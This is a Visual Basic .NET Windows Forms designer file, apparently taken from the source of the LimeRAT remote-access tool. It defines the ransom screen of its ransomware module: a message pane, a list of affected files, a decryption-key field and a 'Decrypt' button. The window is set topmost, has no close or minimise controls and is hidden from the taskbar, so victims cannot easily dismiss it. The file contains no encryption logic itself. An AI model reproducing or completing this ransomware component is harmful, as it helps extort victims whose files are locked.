<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.txtMSG = New System.Windows.Forms.RichTextBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.txtKey = New System.Windows.Forms.TextBox()
        Me.btnDecrypt = New System.Windows.Forms.Button()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.txtFiles = New System.Windows.Forms.RichTextBox()
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker3 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker4 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker5 = New System.ComponentModel.BackgroundWorker()
        Me.GroupBox1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.SuspendLayout()
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.txtMSG)
        Me.GroupBox1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.GroupBox1.Location = New System.Drawing.Point(12, 47)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(445, 299)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Message"
        '
        'txtMSG
        '
        Me.txtMSG.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.txtMSG.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.txtMSG.Dock = System.Windows.Forms.DockStyle.Fill
        Me.txtMSG.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.txtMSG.Location = New System.Drawing.Point(3, 22)
        Me.txtMSG.Name = "txtMSG"
        Me.txtMSG.ReadOnly = True
        Me.txtMSG.Size = New System.Drawing.Size(439, 274)
        Me.txtMSG.TabIndex = 0
        Me.txtMSG.Text = ""
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.txtKey)
        Me.GroupBox2.Controls.Add(Me.btnDecrypt)
        Me.GroupBox2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.GroupBox2.Location = New System.Drawing.Point(12, 419)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(1022, 183)
        Me.GroupBox2.TabIndex = 1
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Decryption Key"
        '
        'txtKey
        '
        Me.txtKey.BackColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.txtKey.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.0!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtKey.ForeColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.txtKey.Location = New System.Drawing.Point(6, 58)
        Me.txtKey.Name = "txtKey"
        Me.txtKey.Size = New System.Drawing.Size(1010, 26)
        Me.txtKey.TabIndex = 1
        Me.txtKey.Text = "KEY"
        Me.txtKey.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'btnDecrypt
        '
        Me.btnDecrypt.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnDecrypt.Location = New System.Drawing.Point(377, 114)
        Me.btnDecrypt.Name = "btnDecrypt"
        Me.btnDecrypt.Size = New System.Drawing.Size(279, 50)
        Me.btnDecrypt.TabIndex = 0
        Me.btnDecrypt.Text = "Decrypt"
        Me.btnDecrypt.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.txtFiles)
        Me.GroupBox3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.GroupBox3.Location = New System.Drawing.Point(589, 47)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(445, 299)
        Me.GroupBox3.TabIndex = 1
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Files"
        '
        'txtFiles
        '
        Me.txtFiles.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.txtFiles.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.txtFiles.DetectUrls = False
        Me.txtFiles.Dock = System.Windows.Forms.DockStyle.Fill
        Me.txtFiles.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.txtFiles.Location = New System.Drawing.Point(3, 22)
        Me.txtFiles.Name = "txtFiles"
        Me.txtFiles.ReadOnly = True
        Me.txtFiles.Size = New System.Drawing.Size(439, 274)
        Me.txtFiles.TabIndex = 1
        Me.txtFiles.Text = ""
        '
        'BackgroundWorker1
        '
        '
        'BackgroundWorker2
        '
        '
        'BackgroundWorker3
        '
        '
        'BackgroundWorker4
        '
        '
        'BackgroundWorker5
        '
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(1046, 637)
        Me.ControlBox = False
        Me.Controls.Add(Me.GroupBox3)
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.GroupBox1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.Opacity = 0.9R
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = "LimeRAT | Lime Ransomware"
        Me.TopMost = True
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents GroupBox1 As Windows.Forms.GroupBox
    Friend WithEvents txtMSG As Windows.Forms.RichTextBox
    Friend WithEvents GroupBox2 As Windows.Forms.GroupBox
    Friend WithEvents txtKey As Windows.Forms.TextBox
    Friend WithEvents btnDecrypt As Windows.Forms.Button
    Friend WithEvents GroupBox3 As Windows.Forms.GroupBox
    Friend WithEvents txtFiles As Windows.Forms.RichTextBox
    Friend WithEvents BackgroundWorker1 As ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker2 As ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker3 As ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker4 As ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker5 As ComponentModel.BackgroundWorker
End Class
